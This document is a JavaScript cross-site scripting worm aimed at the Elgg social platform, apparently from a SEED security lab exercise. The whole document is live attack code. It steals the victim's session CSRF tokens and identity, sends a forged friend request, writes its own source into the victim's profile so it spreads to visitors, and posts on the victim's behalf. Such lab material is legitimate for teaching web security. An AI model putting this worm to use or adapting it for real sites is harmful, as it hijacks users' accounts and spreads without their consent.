<script id="worm" type="text/javascript">
   

window.onload = function(){
    // JavaScript code to access user name, user guid, Time Stamp __elgg_ts
    // and Security Token __elgg_token
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    // Construct the content of your URL.
    var userName = elgg.session.user.username;
    var userGuid = elgg.session.user.guid;
    var myRandomText="";
    
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script>";
    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
    //alert(jsCode);

    var content = "__elgg_token=" + token + "&__elgg_ts=" + ts + "&name=" + userName + "&description=" + wormCode + "&accesslevel[description]=2&briefdescription=" + myRandomText + "&accesslevel[briefdescription]=2&location=" + myRandomText + "&accesslevel[location]=2&interests=" + myRandomText + "&accesslevel[interests]=2&skills=" + myRandomText + "&accesslevel[skills]=2&contactemail=" + myRandomText + "&accesslevel[contactemail]=2&phone=" + myRandomText + "&accesslevel[phone]=2&mobile=" + myRandomText + "&accesslevel[mobile]=2&website=" + myRandomText + "&accesslevel[website]=2&twitter=" + myRandomText + "&accesslevel[twitter]=2&guid=" + userGuid;

    if (userGuid != 59) {
        //at first friend req
	var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+ts+token+token;
	var Ajax = null;
        Ajax=new XMLHttpRequest();
	Ajax.open("GET",sendurl,true);
	Ajax.setRequestHeader("Host","www.seed-server.com");
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax.send();
	//friend req done

	//profile update
	sendurl = "http://www.seed-server.com/action/profile/edit";
        Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        // Ajax.setRequestHeader("Host", "www.seed-server.com"); // Host is denied
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
        //profile changes done

	//posting on the wire
	sendurl = "http://www.seed-server.com/action/thewire/add";
	var bodyText = "http://www.seed-server.com/profile/"+userName;	
        content = "__elgg_token=" + token + "&__elgg_ts=" + ts + "&body=" + bodyText;
	Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        // Ajax.setRequestHeader("Host", "www.seed-server.com"); // Host is denied
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
	//done posting
    }
};


</script>